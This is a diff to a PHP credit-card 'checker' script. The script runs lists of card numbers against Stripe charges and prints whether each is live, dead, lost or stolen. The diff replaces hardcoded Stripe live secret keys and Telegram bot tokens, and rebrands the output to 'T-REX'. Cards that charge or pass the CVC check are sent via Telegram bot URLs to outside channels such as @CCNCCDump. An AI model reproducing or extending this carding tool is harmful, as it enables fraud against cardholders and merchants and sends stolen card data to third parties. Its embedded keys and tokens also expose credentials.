@@ -37,7 +37,7 @@ $sk = $_GET['sec'];
 if(!$sk){
   #$sk = "";
   $sks = array(
-    "sk_live_q2EVOc6DEh7ODm8l6AQv1mzo",
+    "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",
     "sk_live_40nB0WoYZffkHrFRtnBd8LoV00u6NNbq1k",
     "sk_live_r3SkUDY2IoOyV5kkejEgwPh5"
 );
@@ -59,11 +59,11 @@ if (strlen($ano) == 2) $ano = "20$ano";
 //================= [ CURL REQUESTS ] =================//
 
 
-$forwardcharged="https://api.telegram.org/bot5962559391:AAErzpu1N9QrF5uMTOYuNzoOeQYk6MHHm2k/sendMessage?chat_id=@sknonskchargedbyprophoenix&parse_mode=MarkDown&text=$emoji | `$lista` |%0A✅ 𝙅𝙚𝙩𝙞𝙭 𝘾𝙝𝙖𝙧𝙜𝙚𝙙 | *$brand* *$category* *$type* |%0A*$bank* | *$country*";
+$forwardcharged="https://api.telegram.org/6501623476:AAHQMeqbE18Fky2c-ME_3D2blUMq8mKVj5U/sendMessage?chat_id=@sknonskchargedbyprophoenix&parse_mode=MarkDown&text=$emoji | `$lista` |%0A✅ REX CHARGED | *$brand* *$category* *$type* |%0A*$bank* | *$country*";
 
-$forwardcvv="https://api.telegram.org/bot5962559391:AAErzpu1N9QrF5uMTOYuNzoOeQYk6MHHm2k/sendMessage?chat_id=@sknonskchargedbyprophoenix&parse_mode=MarkDown&text=$emoji | `$lista` |%0A✅ 𝙅𝙚𝙩𝙞𝙭 𝘾𝙑𝙑 𝙇𝙄𝙑𝙀 | *$brand* *$category* *$type* |%0A*$bank* | *$country*";
+$forwardcvv="https://api.telegram.org/bot6501623476:AAHQMeqbE18Fky2c-ME_3D2blUMq8mKVj5U/sendMessage?chat_id=@sknonskchargedbyprophoenix&parse_mode=MarkDown&text=$emoji | `$lista` |%0A✅ REX CVV LIVE | *$brand* *$category* *$type* |%0A*$bank* | *$country*";
 
-$forwardccn="https://api.telegram.org/bot5962559391:AAErzpu1N9QrF5uMTOYuNzoOeQYk6MHHm2k/sendMessage?chat_id=@CCNCCDump&parse_mode=MarkDown&text=$emoji | `$lista` |%0A✅ 𝙅𝙚𝙩𝙞𝙭 𝘾𝘾𝙉 𝙇𝙄𝙑𝙀 | *$brand* *$category* *$type* |%0A*$bank* | *$country*";
+$forwardccn="https://api.telegram.org/bot6501623476:AAHQMeqbE18Fky2c-ME_3D2blUMq8mKVj5U/sendMessage?chat_id=@CCNCCDump&parse_mode=MarkDown&text=$emoji | `$lista` |%0A✅ REX CCN LIVE | *$brand* *$category* *$type* |%0A*$bank* | *$country*";
 
 
 #-------------------[1st REQ]--------------------#
@@ -162,7 +162,7 @@ break;
 
 if(strpos($result2, '"seller_message": "Payment complete."' )) {
     file_get_contents($forwardcharged);
-    echo 'CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>➤ Response: $'.$amt.' CCN Charged ✅ 𝙅𝙚𝙩𝙞𝙭  <br> ➤ Receipt : <a href='.$receipturl.'>Here</a><br>';
+    echo 'CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>➤ Response: $'.$amt.' CCN Charged ✅ T-REX <br> ➤ Receipt : <a href='.$receipturl.'>Here</a><br>';
 }
 elseif(strpos($result2,'"cvc_check": "pass"')){
     file_get_contents($forwardcvv);
@@ -220,7 +220,7 @@ elseif(strpos($result2, "lost_card" )) {
     echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: LOST CARD</span><br>';
 }
 elseif(strpos($result2, "lost_card" )) {
-    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: LOST CARD</span></span>  <br>Result: CHECKER BY checker</span> <br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: LOST CARD</span></span>  <br>Result: CHECKER BY T-REX</span> <br>';
 }
 
 elseif(strpos($result2, "stolen_card" )) {
